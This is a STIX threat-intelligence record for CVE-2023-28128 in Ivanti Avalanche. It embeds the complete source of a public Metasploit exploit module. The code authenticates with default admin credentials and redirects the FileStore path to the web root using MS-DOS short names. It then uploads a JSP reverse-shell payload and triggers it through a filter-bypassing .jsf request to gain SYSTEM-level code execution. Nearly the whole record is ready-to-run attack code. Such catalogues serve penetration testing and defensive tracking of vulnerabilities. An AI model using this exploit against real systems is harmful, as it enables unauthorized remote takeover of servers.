{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0709d039-5306-47e0-a049-d1eaf89aa912",
    "created": "2024-08-14T16:51:59.440182Z",
    "modified": "2024-08-14T16:51:59.440185Z",
    "name": "Ivanti Avalanche FileStoreConfig File Upload",
    "description": " Ivanti Avalanche prior to v6.4.0.186 permits MS-DOS style short names in the configuration path for the Central FileStore. Because of this, an administrator can change the default path to the web root of the applications, upload a JSP file, and achieve RCE as NT AUTHORITY\\SYSTEM.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ivanti_avalanche_filestoreconfig_upload.rb",
            "external_id": "ivanti_avalanche_filestoreconfig_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/advisories/ZDI-23-456/"
        },
        {
            "source_name": "reference",
            "url": "https://forums.ivanti.com/s/article/ZDI-CAN-17812-Ivanti-Avalanche-FileStoreConfig-Arbitrary-File-Upload-Remote-Code-Execution-Vulnerability?language=en_US"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/jcdcN9SN9V/cve-2023-28128"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28128"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ivanti Avalanche FileStoreConfig File Upload',\n        'Description' => %q{\n          Ivanti Avalanche prior to v6.4.0.186 permits MS-DOS style short\n          names in the configuration path for the Central FileStore. Because of\n          this, an administrator can change the default path to the web root\n          of the applications, upload a JSP file, and achieve RCE as NT AUTHORITY\\SYSTEM.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Piotr Bazydlo', # @chudypb - Vulnerability Discovery\n          'Shelby Pace' # Metasploit module\n        ],\n        'References' => [\n          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-23-456/'],\n          ['URL', 'https://forums.ivanti.com/s/article/ZDI-CAN-17812-Ivanti-Avalanche-FileStoreConfig-Arbitrary-File-Upload-Remote-Code-Execution-Vulnerability?language=en_US'],\n          ['URL', 'https://attackerkb.com/topics/jcdcN9SN9V/cve-2023-28128'],\n          ['CVE', '2023-28128']\n        ],\n        'Platform' => ['win', 'java'],\n        'Privileged' => true,\n        'Arch' => ARCH_JAVA,\n        'Targets' => [\n          [ 'Automatic Target', { 'DefaultOptions' => { 'Payload' => 'java/jsp_shell_reverse_tcp' } }]\n        ],\n        'DisclosureDate' => '2023-04-24',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('USERNAME', [ true, 'User name to log in with', 'amcadmin' ]),\n        OptString.new('PASSWORD', [ true, 'Password to log in with', 'admin' ]),\n        OptString.new('TARGETURI', [ true, 'The URI of the Example Application', '/AvalancheWeb' ])\n      ]\n    )\n  end\n\n  def check\n    # Cleanup should not be needed after doing just a check.\n    @cleanup_needed = false\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'login.jsf'),\n      'method' => 'GET'\n    )\n\n    return CheckCode::Unknown('Failed to receive a response from the application') unless res\n\n    unless res.body.include?('Avalanche - User Login')\n      return CheckCode::Safe('Application does not appear to be Ivanti Avalanche')\n    end\n\n    html = res.get_html_document\n    elem = html.search('link')&.find { |link| link&.at('@href')&.text&.match(/\\d+\\.\\d+\\.\\d+\\.\\d{1,4}/) }\n    return CheckCode::Detected('Couldn\\'t retrieve element containing Avalanche version') unless elem\n\n    version = elem&.at('@href')&.value&.match(/(\\d+\\.\\d+\\.\\d+\\.\\d{1,4})/)\n    return CheckCode::Detected('Failed to retrieve software version') unless version && version.length >= 2\n\n    version = version[1]\n    vprint_status(\"Version of Ivanti Avalanche appears to be v#{version}\")\n    ver_no = Rex::Version.new(version)\n    patched_version = Rex::Version.new('6.4.0.186')\n\n    if ver_no >= patched_version\n      CheckCode::Safe('Target has been patched!')\n    elsif ver_no < patched_version\n      CheckCode::Appears('Target appears to be running an unpatched version of Ivanti Avalanche!')\n    else\n      CheckCode::Unknown(\"This should never be hit! Some error occurred when grabbing the target version: #{ver_no}\")\n    end\n  end\n\n  def authenticate\n    if datastore['USERNAME'].blank? && datastore['PASSWORD'].blank?\n      fail_with(Failure::BadConfig, 'Please set the USERNAME and PASSWORD options')\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'login.jsf'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('Avalanche - User Login')\n\n    html = res.get_html_document\n    view_state = get_view_state(html)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve view state after browsing to the login page.') unless view_state\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'login.jsf'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'loginForm' => 'loginForm',\n        'j_idt8' => '',\n        'loginField' => datastore['USERNAME'],\n        'passwordField' => datastore['PASSWORD'],\n        'TextCaptchaAnswer' => '',\n        'javax.faces.ViewState' => view_state,\n        'loginTableButton' => 'loginTableButton'\n      }\n    )\n\n    unless res&.code == 302 && res&.headers&.dig('Location')&.include?('inventory.jsf')\n      fail_with(Failure::UnexpectedReply, 'Login failed')\n    end\n  end\n\n  def get_view_state(html)\n    view_state = html.xpath(\"//input[@name='javax.faces.ViewState']\")&.first&.at('@value')&.text\n\n    view_state\n  end\n\n  def configure_filestore\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    unless res&.get_html_document&.xpath('//form[@id=\"form_filestore_tree\"]')&.first\n      fail_with(Failure::UnexpectedReply, 'Failed to access FileStore configuration')\n    end\n\n    html = res.get_html_document\n    view_state = get_view_state(html)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve view state from FileStoreConfig page') unless view_state\n\n    @original_config_path = html.xpath(\"//input[@id='txtUncPath']\")&.first&.at('@value')&.text\n    fail_with(Failure::UnexpectedReply, 'Unable to grab FileStore path') unless @original_config_path\n    print_status(\"Original FileStore config path: '#{@original_config_path}'\")\n\n    # determine drive letter\n    drive_letter = @original_config_path.match(/([a-zA-Z])(:|\\$)/)\n    fail_with(Failure::UnexpectedReply, 'Couldn\\'t determine drive letter for path') unless drive_letter&.length&.>= 3\n    drive_letter = drive_letter[1]\n\n    new_config_path = \"#{drive_letter}:\\\\PROGRA~1\\\\Wavelink\\\\AVALAN~1\\\\Web\"\n    print_status(\"Changing FileStore config path to '#{new_config_path}'\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'linkFileStoreConfigSave' => 'linkFileStoreConfigSave',\n        'formFileStoreConfig' => 'formFileStoreConfig',\n        'txtUncPath' => new_config_path,\n        'txtVelocityFolder' => '',\n        'javax.faces.ViewState' => view_state\n      }\n    )\n\n    input_field_html = res&.get_html_document&.xpath('//input[@id=\"txtUncPath\"]')&.first\n    if input_field_html.blank?\n      fail_with(Failure::UnexpectedReply, 'Did not receive a response containing the expected txtUncPath input field!')\n    elsif input_field_html[:value] != new_config_path\n      fail_with(Failure::UnexpectedReply, 'Failed to change FileStore config path')\n    end\n  end\n\n  def get_directory_val(res, dir_name)\n    html = res.get_html_document\n    results = html.xpath('//tr[contains(@class, \"DIRECTORY\")]')\n    fail_with(Failure::UnexpectedReply, 'Failed to find list of expected directories') unless results\n\n    expand_dir = results.find { |result| result.at('td')&.text&.strip == dir_name }\n    fail_with(Failure::UnexpectedReply, \"Failed to find the '#{dir_name}' directory to write to\") unless expand_dir\n    data_rk = expand_dir.at('@data-rk')&.value\n    fail_with(Failure::UnexpectedReply, \"Failed to get value to expand #{dir_name} directory\") unless data_rk\n\n    data_rk\n  end\n\n  def expand_folder(data_rk, view_state)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'javax.faces.source' => 'fileStoreTree_dlgFileStoreTree',\n        'javax.faces.partial.execute' => 'fileStoreTree_dlgFileStoreTree',\n        'fileStoreTree_dlgFileStoreTree' => 'fileStoreTree_dlgFileStoreTree',\n        'fileStoreTree_dlgFileStoreTree_expand' => data_rk,\n        'javax.faces.ViewState' => view_state\n      }\n    )\n  end\n\n  def select_folder(data_rk, view_state)\n    @cleanup_needed = true\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' =>\n      {\n        'javax.faces.source' => 'fileStoreTree_dlgFileStoreTree',\n        'javax.faces.partial.execute' => 'fileStoreTree_dlgFileStoreTree',\n        'javax.faces.behavior.event' => 'select',\n        'javax.faces.partial.event' => 'select',\n        'fileStoreTree_dlgFileStoreTree_instantSelection' => data_rk,\n        'form_filestore_tree' => 'form_filestore_tree',\n        'fileStoreTree_dlgFileStoreTree_selection' => data_rk,\n        'javax.faces.ViewState' => view_state\n      }\n    )\n  end\n\n  def upload_payload\n    payload_name = \"#{Rex::Text.rand_text_alpha(5..12)}.jsp\"\n    # need to 'select' webapps/AvalancheWeb to upload a file\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to access updated FileStore page') unless res&.get_html_document&.xpath('//form[@id=\"form_filestore_tree\"]')&.first\n    web_data_rk = get_directory_val(res, 'webapps')\n    view_state = get_view_state(res.get_html_document)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve view state after accessing the updated FileStore page') unless view_state\n\n    res = expand_folder(web_data_rk, view_state)\n    fail_with(Failure::UnexpectedReply, 'Did not receive response from \\'webapps\\' expansion') unless res\n    avalanche_data_rk = get_directory_val(res, 'AvalancheWeb')\n    view_state = get_view_state(res.get_html_document)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve view state after getting the directory value for AvalancheWeb') unless view_state\n    res = select_folder(avalanche_data_rk, view_state)\n    fail_with(Failure::UnexpectedReply, 'Did not receive response from \\'AvalancheWeb\\' selection') unless res\n\n    view_state = get_view_state(res.get_html_document)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve view state after selecting the AvalancheWeb folder') unless view_state\n\n    boundary = \"#{'-' * 4}WebKitFormBoundary#{Rex::Text.rand_text_alphanumeric(16)}\"\n\n    post_data = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"upload-form\\\"\\r\\n\\r\\n\"\n    post_data << \"upload-form\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"javax.faces.ViewState\\\"\\r\\n\\r\\n\"\n    post_data << \"#{view_state}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"javax.faces.partial.ajax\\r\\n\\r\\n\"\n    post_data << \"true\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"javax.faces.partial.execute\\\"\\r\\n\\r\\n\"\n    post_data << \"importFileStoreItemPanel_dlgFileStoreTree\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"javax.faces.source\\\"\\r\\n\\r\\n\"\n    post_data << \"importFileStoreItemPanel_dlgFileStoreTree\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"javax.faces.partial.render\\\"\\r\\n\\r\\n\"\n    post_data << \"fileStoreTree_dlgFileStoreTree managementBtns addFolderDialog_dlgFileStoreTree renameItemDialog_dlgFileStoreTree confirmDeleteItemDialog_dlgFileStoreTree importMessages\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"importFileStoreItemPanel_dlgFileStoreTree\\\"; filename=\\\"#{payload_name}\\\"\\r\\n\"\n    post_data << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n    post_data << \"#{payload.encoded}\\r\\n\"\n    post_data << \"--#{boundary}--\\r\\n\"\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'data' => post_data,\n      'headers' => {\n        'Accept' => 'application/xml, text/xml, */*; q=0.01',\n        'Faces-Request' => 'partial/ajax',\n        'X-RequestedWith' => 'XMLHttpRequest',\n        'Content-Type' => \"multipart/form-data; boundary=#{boundary}\",\n        'Accept-Encoding' => 'gzip, deflate'\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to upload payload') unless res&.body&.include?(\"Imported file #{payload_name}\")\n\n    print_good(\"Successfully uploaded '#{payload_name}'\")\n    payload_name\n  end\n\n  def cleanup\n    if @cleanup_needed == false\n      return\n    end\n\n    restore_msg = 'Please manually restore FileStore config via Tools -> Central FileStore -> Configurations.'\n    print_status('Attempting to restore config path')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    unless res\n      print_error(\"Could not access FileStore config. #{restore_msg}\")\n      return\n    end\n\n    html = res.get_html_document\n    view_state = get_view_state(html)\n    unless view_state\n      print_error(\"Failed to get view state. #{restore_msg}\")\n      return\n    end\n\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'linkFileStoreConfigSave' => 'linkFileStoreConfigSave',\n        'formFileStoreConfig' => 'formFileStoreConfig',\n        'txtUncPath' => @original_config_path,\n        'txtVelocityFolder' => '',\n        'javax.faces.ViewState' => view_state\n      }\n    )\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'FileStoreConfig.jsf'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    unless res&.body&.include?(@original_config_path)\n      print_warning(\"Failed to restore the FileStore config path to its original path. #{restore_msg}\")\n      return\n    end\n\n    print_good('Successfully restored the FileStore config path')\n  end\n\n  def exploit\n    # Starting off we shouldn't need cleanup, however if we get to the point were we start\n    # to change config settings then we will need to clean that up.\n    @cleanup_needed = false\n\n    authenticate\n    configure_filestore\n    payload_name = upload_payload\n\n    register_file_for_cleanup(\"webapps/#{payload_name}\")\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, payload_name.gsub('jsp', 'jsf')), # bypasses the app's filter, but is still resolved by java faces servlet\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-04-24",
    "x_mitre_platforms": [
        "['win', 'java']"
    ]
}